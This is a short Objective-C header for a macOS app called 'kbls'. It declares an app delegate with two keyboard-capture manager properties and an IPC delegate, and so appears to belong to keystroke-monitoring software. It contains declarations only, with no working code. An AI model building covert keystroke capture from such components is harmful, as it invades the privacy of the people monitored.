//
//  AppDelegate.h
//  kbls
//
//  Created by Makara Khloth on 6/18/16.
//  Copyright © 2016 Makara Khloth. All rights reserved.
//

#import <Cocoa/Cocoa.h>
#import "MessagePortIPCReader.h"

@class AgentKeyboardACCaptureManager, AgentKeyboardCaptureManager;

@interface AppDelegate : NSObject <NSApplicationDelegate, MessagePortIPCDelegate>

@property (nonatomic, strong) AgentKeyboardACCaptureManager *agenKeyboardACCaptureManager;
@property (nonatomic, strong) AgentKeyboardCaptureManager *agentKeyboardCaptureManager;

@end

